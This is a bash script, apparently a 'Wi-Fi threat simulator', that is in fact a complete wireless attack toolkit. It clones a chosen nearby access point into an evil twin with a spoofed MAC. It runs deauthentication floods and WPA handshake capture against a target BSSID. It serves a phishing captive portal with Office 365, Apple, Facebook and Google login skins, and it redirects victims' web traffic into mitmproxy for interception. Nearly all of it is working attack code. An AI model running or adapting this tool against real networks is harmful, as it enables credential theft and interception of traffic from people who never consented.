#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
NC='\033[0m'

set -e

BASE="/opt/wifi-threat-sim"
AP_CONF="$BASE/configs/hostapd.conf"
DNS_CONF="$BASE/configs/dnsmasq.conf"
PHISH_PORTAL="$BASE/phishing_portal"
SKINS_DIR="$PHISH_PORTAL/skins"
LOGDIR="$BASE/logs"
MITM_LOG="$LOGDIR/mitmproxy.log"
MITMSTATE="off"

# Dynamic variables (auto-detected)
IFACE=""
AP_IP=""
AP_SUBNET="24"
DHCP_START=""
DHCP_END=""
DNS_SERVER=""
GATEWAY=""

[ -d "$LOGDIR" ] || mkdir -p "$LOGDIR"
[ -d "$SKINS_DIR" ] || mkdir -p "$SKINS_DIR"

declare -A SKIN_TO_REDIRECT=(
    [o365.html]="https://outlook.office.com/"
    [apple.html]="https://appleid.apple.com/"
    [facebook.html]="https://facebook.com/"
    [google.html]="https://accounts.google.com/"
    [cafe.html]="https://apple.com/"
)

SELECTED_SKIN="cafe.html"

function check_cmd() {
    command -v "$1" >/dev/null 2>&1 || { echo -e "${RED}[!] Missing required tool: $1${NC}"; exit 1; }
}

# Auto-detect wireless interface
function auto_detect_iface() {
    local wifi_ifaces=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}' | head -1)
    
    if [ -z "$wifi_ifaces" ]; then
        echo -e "${RED}[!] No wireless interface detected${NC}"
        return 1
    fi
    
    IFACE="$wifi_ifaces"
    echo -e "${GREEN}[✓] Auto-detected interface: $IFACE${NC}"
    return 0
}

# Detect and adapt network configuration
function auto_adapt_network() {
    echo -e "${CYAN}[*] Detecting network environment...${NC}"
    
    # Check if connected to internet
    if ping -c 1 8.8.8.8 >/dev/null 2>&1; then
        GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
        echo -e "${GREEN}[✓] Internet detected via gateway: $GATEWAY${NC}"
        
        # Get current network range
        local current_net=$(ip addr show | grep "inet " | awk '{print $2}' | grep -v "127.0.0.1" | head -1 | cut -d/ -f1)
        if [ -n "$current_net" ]; then
            local net_prefix=$(echo "$current_net" | cut -d. -f1-3)
            AP_IP="${net_prefix}.100"
            DHCP_START="${net_prefix}.101"
            DHCP_END="${net_prefix}.200"
            DNS_SERVER="${net_prefix}.100"
            echo -e "${GREEN}[✓] Using adaptive network: $AP_IP/24${NC}"
            return 0
        fi
    fi
    
    # Offline mode - use private ranges
    echo -e "${YELLOW}[!] No internet detected - using isolated AP mode${NC}"
    
    # Find unused private range
    local used_ranges=$(ip addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+' | cut -d. -f1-3 | sort -u)
    
    local ranges=("10.0.0" "10.1.0" "10.2.0" "10.3.0" "172.16.0" "172.17.0" "192.168.100" "192.168.200")
    
    for range in "${ranges[@]}"; do
        if ! echo "$used_ranges" | grep -q "^${range}$"; then
            AP_IP="${range}.1"
            DHCP_START="${range}.10"
            DHCP_END="${range}.250"
            DNS_SERVER="${range}.1"
            echo -e "${GREEN}[✓] Using isolated network: $AP_IP/24${NC}"
            return 0
        fi
    done
    
    # Ultimate fallback
    AP_IP="10.99.99.1"
    DHCP_START="10.99.99.10"
    DHCP_END="10.99.99.250"
    DNS_SERVER="10.99.99.1"
    echo -e "${YELLOW}[!] Using fallback network: $AP_IP/24${NC}"
}

# Monitor and adapt to system changes
function monitor_system() {
    echo -e "${CYAN}[*] Monitoring system resources...${NC}"
    
    # Check available memory
    local mem_free=$(free -m | awk 'NR==2{print $7}')
    if [ "$mem_free" -lt 100 ]; then
        echo -e "${YELLOW}[!] Low memory: ${mem_free}MB - reducing services${NC}"
    fi
    
    # Check CPU
    local cpu_load=$(uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | cut -d. -f1)
    if [ "$cpu_load" -gt 2 ]; then
        echo -e "${YELLOW}[!] High CPU load: $cpu_load - reducing intensity${NC}"
    fi
    
    # Check disk space
    local disk_free=$(df /opt | awk 'NR==2{print $4}')
    if [ "$disk_free" -lt 500000 ]; then
        echo -e "${YELLOW}[!] Low disk space: ${disk_free}KB${NC}"
        sudo rm -rf "$LOGDIR"/* 2>/dev/null || true
        mkdir -p "$LOGDIR"
    fi
    
    echo -e "${GREEN}[✓] System check complete${NC}"
}

# Adapt DNS based on network conditions
function adapt_dns() {
    # Try to detect best DNS server
    if ping -c 1 1.1.1.1 >/dev/null 2>&1; then
        echo "server=1.1.1.1" >> "$DNS_CONF"
    elif ping -c 1 8.8.8.8 >/dev/null 2>&1; then
        echo "server=8.8.8.8" >> "$DNS_CONF"
    else
        echo "server=208.67.222.222" >> "$DNS_CONF"  # OpenDNS fallback
    fi
}

function stop_pyserver() {
    sudo pkill -f "$PHISH_PORTAL/server.py" && echo -e "${GREEN}[✓] Captive phishing server stopped.${NC}"
}

function install_deps() {
    PKGS=(hostapd dnsmasq iw aircrack-ng python3 openssl mitmproxy curl wget)
    MISSING=()
    for p in "${PKGS[@]}"; do
        command -v $p >/dev/null 2>&1 || MISSING+=($p)
    done
    if [ ${#MISSING[@]} -eq 0 ]; then
        echo -e "${GREEN}All dependencies are already installed!${NC}"; return;
    fi
    echo -e "${YELLOW}Missing:${NC} ${MISSING[*]}"
    read -p "Install? [Y/n]: " ans
    [[ $ans =~ ^[Nn] ]] && echo "Aborted." && return
    if command -v apt >/dev/null 2>&1; then
        sudo apt update
        sudo apt install -y "${MISSING[@]}"
    elif command -v dnf >/dev/null 2>&1; then
        sudo dnf install -y "${MISSING[@]}"
    elif command -v yum >/dev/null 2>&1; then
        sudo yum install -y "${MISSING[@]}"
    elif command -v pacman >/dev/null 2>&1; then
        sudo pacman -Sy --noconfirm "${MISSING[@]}"
    else
        echo -e "${RED}No package manager found${NC}"
        return 1
    fi
    echo -e "${GREEN}Installation complete${NC}"
}

function cleanup() {
    echo -e "${CYAN}[*] Cleaning up...${NC}"
    sudo pkill -f 'hostapd.*config' 2>/dev/null || true
    sudo pkill -f 'dnsmasq.*config' 2>/dev/null || true
    sudo pkill -f 'airodump-ng' 2>/dev/null || true
    sudo pkill -f 'aireplay-ng' 2>/dev/null || true
    sudo pkill -f "python3 $PHISH_PORTAL/server.py" 2>/dev/null || true
    sudo pkill -f mitmproxy 2>/dev/null || true
    sudo pkill -f mitmweb 2>/dev/null || true
    sudo iptables -F 2>/dev/null || true
    sudo iptables -t nat -F 2>/dev/null || true
    sudo systemctl restart NetworkManager 2>/dev/null || sudo service network-manager restart 2>/dev/null || true
    [ -n "$IFACE" ] && sudo ip link set "$IFACE" down 2>/dev/null || true
    sleep 1
    echo -e "${GREEN}[✓] Reset complete${NC}"
}

trap cleanup EXIT

function banner() {
    clear
    echo -e "${BLUE}"
    echo "  ___  _  _ ___ _  _ _      _    _ _    \\     /  "
    echo " |_ _|| \\| | __| \\| | |    /_\\  ||  \\   /     \\  "
    echo "  | | | .\` | _|| .\` | |__ / _ \\ ||  (  /       \\  "
    echo " |___||_|\\_|___|_|\\_|____/_/ \\_\\||__/ /_________\\"
    echo -e "${CYAN}    Wi-Fi Threat Simulator - Auto-Adaptive${NC}"
    echo -e "${CYAN}Interface: ${IFACE:-[detecting...]} | AP: ${AP_IP:-[auto]} | Status: ${MITMSTATE}${NC}\n"
}

function prompt_iface(){
    iwlist_out=$(iw dev 2>/dev/null | awk '/Interface/ {print NR\") \" $2}')
    if [ -z "$iwlist_out" ]; then
        echo -e "${RED}[!] No wireless interface found. Aborting.${NC}"
        exit 1
    fi
    echo -e "${CYAN}Available interfaces:${NC}"
    echo "$iwlist_out"
    while true; do
        read -p "Select interface number (or press Enter for auto): " ifaceidx
        if [ -z "$ifaceidx" ]; then
            auto_detect_iface && break
        else
            IFACE=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}' | sed -n "${ifaceidx}p")
            [ -n "$IFACE" ] && break
            echo -e "${RED}Invalid choice${NC}"
        fi
    done
}

function scan_wifi_interfaces_and_networks() {
    iwlist_out=$(iw dev 2>/dev/null | awk '/Interface/ {print " - " $2}')
    if [ -z "$iwlist_out" ]; then
        echo -e "${RED}No wireless interface found${NC}"
        read -p "Press Enter to return..."
        return
    fi
    echo -e "${CYAN}Available interfaces:${NC}"
    echo "$iwlist_out"
    echo
    for iface in $(iw dev 2>/dev/null | awk '/Interface/ {print $2}'); do
        echo -e "${YELLOW}[Interface: $iface]${NC}"
        sudo iw "$iface" scan 2>/dev/null | grep -E 'SSID:|primary channel' | awk '
            /primary channel:/ {chan=$3}
            /SSID:/ {printf "  SSID: %-30s Channel: %s\n", substr($0, index($0,$2)), chan}'
    done
    read -p "Press Enter to return..."
}

function gen_configs() {
    mkdir -p "$(dirname "$AP_CONF")"
    cat > "$AP_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$FAKESSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$FAKEPASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    mkdir -p "$(dirname "$DNS_CONF")"
    cat > "$DNS_CONF" <<EOF
interface=$IFACE
dhcp-range=$DHCP_START,$DHCP_END,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$DNS_SERVER
listen-address=$AP_IP
EOF
    adapt_dns
}

function start_rogue_ap(){
    echo -e "${CYAN}[*] Initializing rogue AP...${NC}"
    
    if [ -z "$IFACE" ]; then
        prompt_iface
    fi
    
    if [ -z "$AP_IP" ]; then
        auto_adapt_network
    fi
    
    check_cmd iw
    check_cmd ip
    
    echo -e "${CYAN}[*] Scanning for APs...${NC}"
    SCAN_FILE=$(mktemp)
    sudo timeout 5s iw "$IFACE" scan 2>/dev/null > "$SCAN_FILE"
    MAPSIDS=()
    MACS=()
    CHANS=()
    id=1
    
    while read -r mac; do
        ssid=$(awk -v mac="$mac" '
            $0 ~ mac {found=1}
            found && /SSID:/ {sub("SSID: ", ""); print; exit}
        ' "$SCAN_FILE" | head -1)
        chan=$(awk -v mac="$mac" '
            $0 ~ mac {found=1}
            found && /primary channel:/ {print $3; exit}
        ' "$SCAN_FILE" | head -1)
        [ -z "$ssid" ] && continue
        printf "%2d) SSID: %-30s BSSID: %s Channel: %s\n" $id "$ssid" "$mac" "$chan"
        MAPSIDS+=("$ssid")
        MACS+=("$mac")
        CHANS+=("$chan")
        id=$((id+1))
    done < <(grep -oE 'BSS ([0-9A-Fa-f:]{17})' "$SCAN_FILE" | awk '{print $2}' | uniq)
    
    rm -f "$SCAN_FILE"
    
    if [ ${#MACS[@]} -eq 0 ]; then echo -e "${RED}No AP found!${NC}"; return; fi
    
    read -p "Clone which AP? (number): " twin
    twinidx=$((twin-1))
    FAKESSID="${MAPSIDS[$twinidx]}"
    REALMAC="${MACS[$twinidx]}"
    CHANNEL="${CHANS[$twinidx]}"
    
    if [ -z "$FAKESSID" ] || [ -z "$REALMAC" ]; then echo -e "${RED}Invalid selection${NC}"; return; fi
    
    read -p "Set fake WPA2 password: " FAKEPASS
    
    IFS=':' read -r -a macarr <<< "$REALMAC"
    last=$(( 0x${macarr[5]} ))
    new_last=$(printf "%02x" $(( (last + 1) & 0xff )) )
    FAKEMAC="${macarr[0]}:${macarr[1]}:${macarr[2]}:${macarr[3]}:${macarr[4]}:$new_last"
    
    sudo ip link set "$IFACE" down 2>/dev/null
    sudo ip link set "$IFACE" address "$FAKEMAC"
    sudo ip link set "$IFACE" up
    sudo ip addr flush dev "$IFACE" 2>/dev/null
    sudo ip addr add "$AP_IP/$AP_SUBNET" dev "$IFACE"
    
    sudo pkill -f 'hostapd.*config' 2>/dev/null || true
    sudo pkill -f 'dnsmasq.*config' 2>/dev/null || true
    
    gen_configs
    sudo hostapd "$AP_CONF" > /tmp/hostapd.log 2>&1 &
    sleep 3
    sudo dnsmasq -C "$DNS_CONF" > /tmp/dnsmasq.log 2>&1 &
    sudo iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
    sudo iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true
    
    echo -e "${GREEN}[+] Evil Twin \"$FAKESSID\" running on channel $CHANNEL at $AP_IP${NC}"
}

function deauth_attack() {
    if [ -z "$IFACE" ]; then prompt_iface; fi
    read -p "AP BSSID (target): " BSSID; [ -z "$BSSID" ] && echo -e "${RED}No BSSID given${NC}" && return
    while true; do read -p "Channel: " CH; [[ "$CH" =~ ^[0-9]+$ ]] && break; done
    sudo ip link set "$IFACE" down 2>/dev/null
    sudo iw "$IFACE" set monitor control
    sudo ip link set "$IFACE" up
    sudo airodump-ng -c "$CH" --bssid "$BSSID" "$IFACE"
    read -p "Station (leave empty for broadcast): " STATION
    if [ -z "$STATION" ]; then
        sudo aireplay-ng --deauth 25 -a "$BSSID" "$IFACE"
    else
        sudo aireplay-ng --deauth 25 -a "$BSSID" -c "$STATION" "$IFACE"
    fi
}

function handshake_capture() {
    if [ -z "$IFACE" ]; then prompt_iface; fi
    read -p "AP BSSID (target): " BSSID; [ -z "$BSSID" ] && echo -e "${RED}No BSSID entered${NC}" && return
    while true; do read -p "Channel: " CH; [[ "$CH" =~ ^[0-9]+$ ]] && break; done
    TS=$(date +%Y%m%d_%H%M%S)
    OUTFILE="$LOGDIR/handshake_$TS"
    sudo airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTFILE" "$IFACE"
}

function select_portal_skin() {
    skins=($SKINS_DIR/*.html)
    if [ ! -f "${skins[0]}" ]; then echo -e "${RED}No skins found${NC}"; return; fi
    echo -e "${CYAN}Available skins:${NC}"
    for i in "${!skins[@]}"; do
        echo "$((i+1))) $(basename "${skins[$i]}")"
    done
    read -p "Select skin: " skn
    [[ "$skn" =~ ^[0-9]+$ ]] && (( skn >= 1 && skn <= ${#skins[@]} )) || { echo "Invalid"; return; }
    cp "${skins[$((skn-1))]}" "$PHISH_PORTAL/index.html"
    SELECTED_SKIN=$(basename "${skins[$((skn-1))]}")
    echo -e "${GREEN}[✓] Selected: $SELECTED_SKIN${NC}"
}

function phishing_portal() {
    if [ -z "$AP_IP" ]; then auto_adapt_network; fi
    SKINBN=$(basename "$SELECTED_SKIN")
    REDIRECT="${SKIN_TO_REDIRECT[$SKINBN]}"
    [ -z "$REDIRECT" ] && REDIRECT="https://apple.com/"
    read -p "HTTP or HTTPS? [http/https]: " proto
    cd "$PHISH_PORTAL" || return
    if [[ "$proto" =~ ^[Hh][Tt][Tt][Pp][Ss]$ ]]; then
        sudo python3 server.py --https --redirect "$REDIRECT" &
        echo -e "${GREEN}[+] Portal at https://$AP_IP${NC}"
    else
        sudo python3 server.py --redirect "$REDIRECT" &
        echo -e "${GREEN}[+] Portal at http://$AP_IP${NC}"
    fi
    cd "$BASE" || true
    read -p "Press Enter to stop..."
    pkill -f "python3 $PHISH_PORTAL/server.py"
}

function start_mitmproxy() {
    if [ -z "$IFACE" ]; then prompt_iface; fi
    [ "$MITMSTATE" = "on" ] && echo -e "${YELLOW}Already running!${NC}" && return
    read -p "UI or CLI? [ui/cli]: " mode
    if [ "$mode" = "ui" ]; then
        sudo mitmweb --mode transparent --showhost --listen-port 8080 > "$MITM_LOG" 2>&1 &
    else
        sudo mitmproxy --mode transparent --showhost --listen-port 8080 > "$MITM_LOG" 2>&1 &
    fi
    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
    MITMSTATE="on"
    echo -e "${GREEN}[+] MITMProxy enabled${NC}"
}

function stop_mitmproxy() {
    sudo pkill -f mitmproxy || true
    sudo pkill -f mitmweb || true
    sudo iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 || true
    sudo iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 || true
    MITMSTATE="off"
    echo -e "${GREEN}[+] MITMProxy stopped${NC}"
}

# Initialize on startup
auto_detect_iface
auto_adapt_network
monitor_system

while true; do
    banner
    echo -e "${BLUE}0) Install dependencies${NC}"
    echo -e "${BLUE}1) Scan WiFi networks${NC}"
    echo -e "${BLUE}2) Start Rogue AP${NC}"
    echo -e "${BLUE}3) Deauth client(s)${NC}"
    echo -e "${BLUE}4) Capture handshake${NC}"
    echo -e "${BLUE}5) Choose portal skin${NC}"
    echo -e "${BLUE}6) Launch phishing portal${NC}"
    echo -e "${BLUE}7) Stop phishing portal${NC}"
    if [ "$MITMSTATE" = "on" ]; then
        echo -e "${YELLOW}8) Stop MITMProxy${NC}"
    else
        echo -e "${BLUE}8) Start MITMProxy${NC}"
    fi
    echo -e "${BLUE}9) Reset system${NC}"
    echo -e "${BLUE}10) Exit${NC}"
    echo -ne "${CYAN}Choice [0-10]: ${NC}"; read CHOICE
    case $CHOICE in
        0) install_deps ;;
        1) scan_wifi_interfaces_and_networks ;;
        2) start_rogue_ap ;;
        3) deauth_attack ;;
        4) handshake_capture ;;
        5) select_portal_skin ;;
        6) phishing_portal ;;
        7) stop_pyserver ;;
        8) if [ "$MITMSTATE" = "off" ]; then start_mitmproxy; else stop_mitmproxy; fi ;;
        9) cleanup ;;
        10) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
        *) echo -e "${RED}Invalid option${NC}" ;;
    esac
    read -p "Press Enter to continue..."
done
